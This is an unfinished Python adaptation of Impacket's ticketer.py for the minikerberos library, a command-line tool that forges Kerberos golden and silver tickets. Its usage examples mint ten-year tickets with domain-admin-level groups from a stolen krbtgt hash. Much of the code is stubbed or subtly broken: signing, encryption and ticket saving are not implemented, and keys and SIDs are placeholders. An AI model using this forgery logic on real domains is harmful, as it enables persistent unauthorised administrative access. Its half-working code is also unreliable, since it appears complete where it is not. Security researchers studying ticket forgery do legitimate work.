#!/usr/bin/env python
# Minikerberos - Collection of Python classes for working with Kerberos protocols.
#
# Copyright (c) 2023
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC)
#   allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the
#   groups, extrasids, etc.
#   Tickets duration is fixed to 10 years from now (although you can manually change it)
#
#   Examples:
#       ./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
#
#       will create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.
#       If you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256
#       (depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as
#       baduser.ccache.
#
#       ./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain <your domain FQDN>
#                     -request -user <a valid domain user> -password <valid domain user's password> baduser
#
#       will first authenticate against the KDC (using -user/-password) and get a TGT that will be used
#       as template for customization. Whatever encryption algorithms used on that ticket will be honored,
#       hence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser' and saved
#       as baduser.ccache.
#
# Author:
#   Alberto Solino (@agsolino) - Original Impacket version
#   Adapted for minikerberos
#
# References:
#   - Original presentation at BlackHat USA 2014 by @gentilkiwi and @passingthehash:
#     (https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it)
#   - Original implementation by Benjamin Delpy (@gentilkiwi) in mimikatz
#     (https://github.com/gentilkiwi/mimikatz)
#
# ToDo:
#   [X] Silver tickets still not implemented - DONE by @machosec and fixes by @br4nsh
#   [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
#

from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import random
import string
import struct
import sys
import asyncio
from calendar import timegm
from time import strptime
from binascii import unhexlify
from typing import List, Optional, Dict, Any

from minikerberos import logger
from minikerberos.common.ccache import CCACHE
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.target import KerberosTarget
from minikerberos.protocol.asn1_structs import (
    AS_REP, TGS_REP, ETYPE_INFO2, AuthorizationData, EncTicketPart, 
    EncASRepPart, EncTGSRepPart, AD_IF_RELEVANT, KDC_REQ_BODY, AS_REQ, TGS_REQ,
    PrincipalName, Realm, Ticket, AP_REQ, Authenticator, EncryptedData,
    PA_FOR_USER_ENC, krb5_pvno, KDCOptions, APOptions, METHOD_DATA, ETYPE_INFO,
    PADATA_TYPE, PA_PAC_REQUEST, PA_ENC_TS_ENC, Checksum, CKSUMTYPE
)
from minikerberos.protocol.constants import (
    ApplicationTagNumbers, PreAuthenticationDataTypes, EncryptionType, 
    PrincipalNameType, ProtocolVersionNumber, TicketFlags, ChecksumTypes, 
    AuthorizationDataType, KERB_NON_KERB_CKSUM_SALT, NAME_TYPE, MESSAGE_TYPE,
    PaDataType
)
from minikerberos.protocol.encryption import Key, _enctype_table, _checksum_table, Enctype, _HMACMD5
from minikerberos.protocol.pac import (
    KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO,
    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PACTYPE,
    PKERB_SID_AND_ATTRIBUTES_ARRAY, VALIDATION_INFO, PAC_CLIENT_INFO, 
    KERB_VALIDATION_INFO, UPN_DNS_INFO_FULL, PAC_REQUESTOR_INFO, PAC_UPN_DNS_INFO,
    PAC_ATTRIBUTES_INFO, PAC_REQUESTOR, PAC_ATTRIBUTE_INFO
)
from minikerberos.protocol.structures import KerberosTime, Principal
from minikerberos.network.aioclientsocket import AIOKerberosClientSocket
from minikerberos.aioclient import AIOKerberosClient


class TICKETER:
    def __init__(self, target: str, password: str, domain: str, options):
        self.__password = password
        self.__target = target
        self.__domain = domain
        self.__options = options
        self.__tgt = None
        self.__tgt_session_key = None
        
        if options.spn:
            spn_parts = options.spn.split('/')
            self.__service = spn_parts[0]
            self.__server = spn_parts[1] if len(spn_parts) > 1 else spn_parts[0]
            if options.keytab is not None:
                self.loadKeysFromKeytab(options.keytab)
        else:
            # we are creating a golden ticket
            self.__service = 'krbtgt'
            self.__server = self.__domain

    @staticmethod
    def getFileTime(t):
        t *= 10000000
        t += 116444736000000000
        return t

    @staticmethod
    def getPadLength(data_length):
        return ((data_length + 7) // 8 * 8) - data_length

    @staticmethod
    def getBlockLength(data_length):
        return (data_length + 7) // 8 * 8

    def loadKeysFromKeytab(self, filename):
        # TODO: Implement keytab loading for minikerberos
        # This would require implementing keytab support in minikerberos
        logging.warning("Keytab loading not yet implemented for minikerberos")
        pass

    def createBasicValidationInfo(self):
        # 1) KERB_VALIDATION_INFO
        kerbdata = KERB_VALIDATION_INFO()

        aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
        unixTime = self.getFileTime(aTime)

        kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
        kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

        # LogoffTime: A FILETIME structure that contains the time the client's logon
        # session should expire. If the session should not expire, this structure
        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime
        # member set to 0xFFFFFFFF.
        kerbdata['LogoffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF

        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user
        # account's forceLogoff attribute value. If the client should not be logged off,
        # this structure SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and
        # the dwLowDateTime member set to 0xFFFFFFFF.
        kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['KickOffTime']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 0xffffffff
        kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32

        kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
        kerbdata['PasswordCanChange']['dwHighDateTime'] = 0

        # PasswordMustChange: A FILETIME structure that contains the time at which
        # the client's password expires. If the password will not expire, this
        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the
        # dwLowDateTime member set to 0xFFFFFFFF.
        kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['EffectiveName'] = self.__target
        kerbdata['FullName'] = ''
        kerbdata['LogonScript'] = ''
        kerbdata['ProfilePath'] = ''
        kerbdata['HomeDirectory'] = ''
        kerbdata['HomeDirectoryDrive'] = ''
        kerbdata['LogonCount'] = 500
        kerbdata['BadPasswordCount'] = 0
        kerbdata['UserId'] = int(self.__options.user_id)

        # Our Golden Well-known groups! :)
        groups = self.__options.groups.split(',')
        if len(groups) == 0:
            # PrimaryGroupId must be set, default to 513 (Domain User)
            kerbdata['PrimaryGroupId'] = 513
        else:
            # Using first group as primary group
            kerbdata['PrimaryGroupId'] = int(groups[0])
        kerbdata['GroupCount'] = len(groups)

        # TODO: Implement GROUP_MEMBERSHIP equivalent for minikerberos
        # For now, we'll use a simplified approach
        for group in groups:
            # This would need to be adapted based on minikerberos PAC implementation
            pass

        kerbdata['UserFlags'] = 0
        kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        kerbdata['LogonServer'] = ''
        kerbdata['LogonDomainName'] = self.__domain.upper()
        # TODO: Implement SID handling for minikerberos
        # kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)
        kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        # TODO: Implement user account control flags
        # kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        kerbdata['SubAuthStatus'] = 0
        kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
        kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
        kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
        kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
        kerbdata['FailedILogonCount'] = 0
        kerbdata['Reserved3'] = 0

        # TODO: Implement resource group handling
        # kerbdata['ResourceGroupDomainSid'] = NULL
        kerbdata['ResourceGroupCount'] = 0
        # kerbdata['ResourceGroupIds'] = NULL

        validationInfo = VALIDATION_INFO()
        validationInfo['Data'] = kerbdata

        return validationInfo

    def createBasicPac(self, kdcRep):
        validationInfo = self.createBasicValidationInfo()
        pacInfos = {}
        pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()
        
        srvCheckSum = PAC_SIGNATURE_DATA()
        privCheckSum = PAC_SIGNATURE_DATA()

        if kdcRep['ticket']['enc-part']['etype'] == EncryptionType.RC4_HMAC.value:
            srvCheckSum['SignatureType'] = ChecksumTypes.HMAC_MD5.value
            privCheckSum['SignatureType'] = ChecksumTypes.HMAC_MD5.value
            srvCheckSum['Signature'] = b'\x00' * 16
            privCheckSum['Signature'] = b'\x00' * 16
        else:
            srvCheckSum['Signature'] = b'\x00' * 12
            privCheckSum['Signature'] = b'\x00' * 12
            if len(self.__options.aesKey) == 64:
                srvCheckSum['SignatureType'] = ChecksumTypes.HMAC_SHA1_96_AES256.value
                privCheckSum['SignatureType'] = ChecksumTypes.HMAC_SHA1_96_AES256.value
            else:
                srvCheckSum['SignatureType'] = ChecksumTypes.HMAC_SHA1_96_AES128.value
                privCheckSum['SignatureType'] = ChecksumTypes.HMAC_SHA1_96_AES128.value

        pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()
        pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()

        clientInfo = PAC_CLIENT_INFO()
        clientInfo['Name'] = self.__target.encode('utf-16le')
        clientInfo['NameLength'] = len(clientInfo['Name'])
        pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()

        if self.__options.extra_pac:
            self.createUpnDnsPac(pacInfos)

        if self.__options.old_pac is False:
            self.createAttributesInfoPac(pacInfos)
            self.createRequestorInfoPac(pacInfos)

        return pacInfos

    def createUpnDnsPac(self, pacInfos):
        upnDnsInfo = UPN_DNS_INFO_FULL()

        PAC_pad = b'\x00' * self.getPadLength(len(upnDnsInfo))
        upn_data = f"{self.__target.lower()}@{self.__domain.lower()}".encode("utf-16-le")
        upnDnsInfo['UpnLength'] = len(upn_data)
        upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)
        total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']
        pad = self.getPadLength(total_len)
        upn_data += b'\x00' * pad

        dns_name = self.__domain.upper().encode("utf-16-le")
        upnDnsInfo['DnsDomainNameLength'] = len(dns_name)
        upnDnsInfo['DnsDomainNameOffset'] = total_len + pad
        total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']
        pad = self.getPadLength(total_len)
        dns_name += b'\x00' * pad

        # Enable additional data mode (Sam + SID)
        upnDnsInfo['Flags'] = 2

        samName = self.__target.encode("utf-16-le")
        upnDnsInfo['SamNameLength'] = len(samName)
        upnDnsInfo['SamNameOffset'] = total_len + pad
        total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']
        pad = self.getPadLength(total_len)
        samName += b'\x00' * pad

        # TODO: Implement SID handling for minikerberos
        user_sid_data = b'\x00' * 32  # Placeholder
        upnDnsInfo['SidLength'] = len(user_sid_data)
        upnDnsInfo['SidOffset'] = total_len + pad
        total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']
        pad = self.getPadLength(total_len)
        user_data = user_sid_data + b'\x00' * pad

        # Post-PAC data
        post_pac_data = upn_data + dns_name + samName + user_data
        # Pac data building
        pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data

    @staticmethod
    def createAttributesInfoPac(pacInfos):
        pacAttributes = PAC_ATTRIBUTE_INFO()
        pacAttributes["FlagsLength"] = 2
        pacAttributes["Flags"] = 1

        pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()

    def createRequestorInfoPac(self, pacInfos):
        pacRequestor = PAC_REQUESTOR()
        # TODO: Implement SID handling for minikerberos
        # pacRequestor['UserSid'] = SID()
        # pacRequestor['UserSid'].fromCanonical(f"{self.__options.domain_sid}-{self.__options.user_id}")

        pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()

    def createBasicTicket(self):
        if self.__options.request is True:
            if self.__domain == self.__server:
                logging.info('Requesting TGT to target domain to use as basis')
            else:
                logging.info('Requesting TGT/TGS to target domain to use as basis')

            # TODO: Implement request functionality using minikerberos client
            logging.error('Request functionality not yet implemented for minikerberos')
            return None, None
        else:
            logging.info('Creating basic skeleton ticket and PAC Infos')
            if self.__domain == self.__server:
                kdcRep = AS_REP()
                kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value
            else:
                kdcRep = TGS_REP()
                kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value
            
            kdcRep['pvno'] = 5
            
            if self.__options.nthash is None:
                # TODO: Implement ETYPE_INFO2 for minikerberos
                pass

            kdcRep['crealm'] = self.__domain.upper()
            kdcRep['cname'] = PrincipalName({
                'name-type': NAME_TYPE.PRINCIPAL.value,
                'name-string': [self.__target]
            })

            kdcRep['ticket'] = Ticket()
            kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value
            kdcRep['ticket']['realm'] = self.__domain.upper()
            kdcRep['ticket']['sname'] = PrincipalName({
                'name-type': NAME_TYPE.SRV_INST.value if self.__domain == self.__server else NAME_TYPE.PRINCIPAL.value,
                'name-string': [self.__service, self.__domain.upper() if self.__domain == self.__server else self.__server]
            })

            kdcRep['ticket']['enc-part'] = EncryptedData()
            kdcRep['ticket']['enc-part']['kvno'] = 2
            kdcRep['enc-part'] = EncryptedData()
            
            if self.__options.nthash is None:
                if len(self.__options.aesKey) == 64:
                    kdcRep['ticket']['enc-part']['etype'] = EncryptionType.AES256_CTS_HMAC_SHA1_96.value
                    kdcRep['enc-part']['etype'] = EncryptionType.AES256_CTS_HMAC_SHA1_96.value
                else:
                    kdcRep['ticket']['enc-part']['etype'] = EncryptionType.AES128_CTS_HMAC_SHA1_96.value
                    kdcRep['enc-part']['etype'] = EncryptionType.AES128_CTS_HMAC_SHA1_96.value
            else:
                kdcRep['ticket']['enc-part']['etype'] = EncryptionType.RC4_HMAC.value
                kdcRep['enc-part']['etype'] = EncryptionType.RC4_HMAC.value

            kdcRep['enc-part']['kvno'] = 2

        pacInfos = self.createBasicPac(kdcRep)
        return kdcRep, pacInfos

    async def getKerberosS4U2SelfU2U(self):
        # TODO: Implement S4U2Self+U2U using minikerberos client
        logging.error('S4U2Self+U2U functionality not yet implemented for minikerberos')
        return None, None, None, None

    def customizeTicket(self, kdcRep, pacInfos):
        logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))

        ticketDuration = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=int(self.__options.duration))

        if self.__options.impersonate:
            # TODO: Implement Sapphire Ticket functionality
            logging.error('Sapphire ticket (impersonation) functionality not yet implemented for minikerberos')
            return None, None, None
        else:
            encTicketPart = EncTicketPart()

            # TODO: Implement ticket flags encoding for minikerberos
            flags = []
            # flags.append(TicketFlags.forwardable.value)
            # flags.append(TicketFlags.proxiable.value)
            # flags.append(TicketFlags.renewable.value)
            # if self.__domain == self.__server:
            #     flags.append(TicketFlags.initial.value)
            # flags.append(TicketFlags.pre_authent.value)
            # encTicketPart['flags'] = encodeFlags(flags)
            
            encTicketPart['key'] = {
                'keytype': kdcRep['ticket']['enc-part']['etype'],
                'keyvalue': b''  # Will be filled with random data
            }

            if encTicketPart['key']['keytype'] == EncryptionType.AES128_CTS_HMAC_SHA1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
            elif encTicketPart['key']['keytype'] == EncryptionType.AES256_CTS_HMAC_SHA1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
            else:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])

            encTicketPart['crealm'] = self.__domain.upper()
            encTicketPart['cname'] = PrincipalName({
                'name-type': NAME_TYPE.PRINCIPAL.value,
                'name-string': [self.__target]
            })

            encTicketPart['transited'] = {
                'tr-type': 0,
                'contents': b''
            }
            
            now = datetime.datetime.now(datetime.timezone.utc)
            encTicketPart['authtime'] = now.replace(microsecond=0)
            encTicketPart['starttime'] = now.replace(microsecond=0)
            encTicketPart['endtime'] = ticketDuration
            encTicketPart['renew-till'] = ticketDuration
            
            # TODO: Implement authorization data handling
            encTicketPart['authorization-data'] = []

            # TODO: Process PAC info and update validation info
            logging.info('\tPAC_LOGON_INFO')
            logging.info('\tPAC_CLIENT_INFO_TYPE')
            logging.info('\tEncTicketPart')

        if self.__domain == self.__server:
            encRepPart = EncASRepPart()
        else:
            encRepPart = EncTGSRepPart()

        encRepPart['key'] = encTicketPart['key']
        encRepPart['last-req'] = []
        encRepPart['nonce'] = 123456789
        encRepPart['key-expiration'] = ticketDuration
        # encRepPart['flags'] = encTicketPart['flags']
        encRepPart['authtime'] = str(encTicketPart['authtime'])
        encRepPart['endtime'] = str(encTicketPart['endtime'])
        encRepPart['starttime'] = str(encTicketPart['starttime'])
        encRepPart['renew-till'] = str(encTicketPart['renew-till'])
        encRepPart['srealm'] = self.__domain.upper()
        encRepPart['sname'] = PrincipalName({
            'name-type': NAME_TYPE.SRV_INST.value if self.__domain == self.__server else NAME_TYPE.PRINCIPAL.value,
            'name-string': [self.__service, self.__domain.upper() if self.__domain == self.__server else self.__server]
        })

        if self.__domain == self.__server:
            logging.info('\tEncAsRepPart')
        else:
            logging.info('\tEncTGSRepPart')
            
        return encRepPart, encTicketPart, pacInfos

    def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):
        logging.info('Signing/Encrypting final ticket')

        # TODO: Implement PAC signing and ticket encryption using minikerberos crypto
        # This is a complex process that involves:
        # 1. Building PAC structure
        # 2. Calculating checksums
        # 3. Encrypting ticket parts
        # 4. Encoding everything properly
        
        logging.error('PAC signing and ticket encryption not yet fully implemented for minikerberos')
        
        # For now, return a placeholder
        return b'', None, None

    def saveTicket(self, ticket, sessionKey):
        logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))
        
        # TODO: Implement CCACHE saving using minikerberos CCACHE class
        ccache = CCACHE()
        
        # if self.__server == self.__domain:
        #     ccache.fromTGT(ticket, sessionKey, sessionKey)
        # else:
        #     ccache.fromTGS(ticket, sessionKey, sessionKey)
        
        # ccache.saveFile(self.__target.replace('/','.') + '.ccache')
        logging.info('CCACHE saving not yet fully implemented for minikerberos')

    async def run(self):
        ticket, adIfRelevant = self.createBasicTicket()
        if ticket is not None:
            encASorTGSRepPart, encTicketPart, pacInfos = self.customizeTicket(ticket, adIfRelevant)
            if encASorTGSRepPart is not None:
                ticket, cipher, sessionKey = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)
                if ticket:
                    self.saveTicket(ticket, sessionKey)


async def main():
    print("Minikerberos Ticket Generator")

    parser = argparse.ArgumentParser(add_help=True, description="Creates a Kerberos golden/silver tickets based on "
                                                                "user options")
    parser.add_argument('target', action='store', help='username for the newly created ticket')
    parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the silver ticket will'
                                                     ' be generated for. if omitted, golden ticket will be created')
    parser.add_argument('-request', action='store_true', default=False, help='Requests ticket to domain and clones it '
                        'changing only the supplied information. It requires specifying -user')
    parser.add_argument('-domain', action='store', required=True, help='the fully qualified domain name (e.g. contoso.com)')
    parser.add_argument('-domain-sid', action='store', required=True, help='Domain SID of the target domain the ticker will be '
                                                            'generated for')
    parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key used for signing the ticket '
                                                                             '(128 or 256 bits)')
    parser.add_argument('-nthash', action="store", help='NT hash used for signing the ticket')
    parser.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file (silver ticket only)')
    parser.add_argument('-groups', action="store", default = '513, 512, 520, 518, 519', help='comma separated list of '
                        'groups user will belong to (default = 513, 512, 520, 518, 519)')
    parser.add_argument('-user-id', action="store", default = '500', help='user id for the user the ticket will be '
                                                                          'created for (default = 500)')
    parser.add_argument('-extra-sid', action="store", help='Comma separated list of ExtraSids to be included inside the ticket\'s PAC')
    parser.add_argument('-extra-pac', action='store_true', help='Populate your ticket with extra PAC (UPN_DNS)')
    parser.add_argument('-old-pac', action='store_true', help='Use the old PAC structure to create your ticket (exclude '
                                                              'PAC_ATTRIBUTES_INFO and PAC_REQUESTOR')
    parser.add_argument('-duration', action="store", default = '87600', help='Amount of hours till the ticket expires '
                                                                             '(default = 24*365*10)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-user', action="store", help='domain/username to be used if -request is chosen (it can be '
                                                     'different from domain/username')
    group.add_argument('-password', action="store", help='password for domain/username')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-impersonate', action="store", help='Sapphire ticket. target username that will be impersonated (through S4U2Self+U2U)'
                                                             ' for querying the ST and extracting the PAC, which will be'
                                                             ' included in the new ticket')

    if len(sys.argv)==1:
        parser.print_help()
        print("\nExamples: ")
        print("\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n")
        print("\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.")
        print("\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256")
        print("\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as")
        print("\tbaduser.ccache.\n")
        print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " 
              "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n")
        print("\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used")
        print("\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,")
        print("\thence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'")
        print("\tand saved as baduser.ccache")
        sys.exit(1)

    options = parser.parse_args()

    # Init logging
    if options.debug:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    if options.domain is None:
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if options.aesKey is None and options.nthash is None and options.keytab is None:
        logging.error('You have to specify either aesKey, or nthash, or keytab')
        sys.exit(1)

    if options.aesKey is not None and options.nthash is not None and options.request is False:
        logging.error('You cannot specify both -aesKey and -nthash w/o using -request. Pick only one')
        sys.exit(1)

    if options.request is True and options.user is None:
        logging.error('-request parameter needs -user to be specified')
        sys.exit(1)

    if options.request is True and options.hashes is None and options.password is None:
        from getpass import getpass
        password = getpass("Password:")
    else:
        password = options.password

    if options.impersonate:
        # Validation for sapphire ticket parameters
        missing_params = []
        required_params = [
            (options.request, "-request"),
            (options.aesKey or options.nthash, "-aesKey or -nthash"),
            (options.domain, "-domain"), 
            (options.user, "-user"), 
            (password, "-password"),
            (options.domain_sid, "-domain-sid"),
            (options.user_id, "-user-id")
        ]
        
        for param, param_name in required_params:
            if not param:
                missing_params.append(param_name)
                
        if missing_params:
            logging.error(f"missing parameters to do sapphire ticket : {', '.join(missing_params)}")
            sys.exit(1)
            
        if not options.old_pac and not options.user_id:
            logging.error(f"missing parameter -user-id. Must be set if not doing -old-pac")
            sys.exit(1)
            
        # Ignored params for sapphire tickets
        ignored_params = []
        if options.extra_pac: 
            ignored_params.append("-extra-pac")
        if options.extra_sid is not None: 
            ignored_params.append("-extra-sid")
        if options.groups is not None: 
            ignored_params.append("-groups")
        if options.duration is not None: 
            ignored_params.append("-duration")
            
        if ignored_params:
            logging.error(f"doing sapphire ticket, ignoring following parameters : {', '.join(ignored_params)}")
            
        # -user-id ignored if -old-pac
        if options.old_pac and options.user_id is not None:
            logging.error(f"parameter -user-id will be ignored when specifying -old-pac in a sapphire ticket attack")

    try:
        executer = TICKETER(options.target, password, options.domain, options)
        await executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print(str(e))


if __name__ == '__main__':
    asyncio.run(main())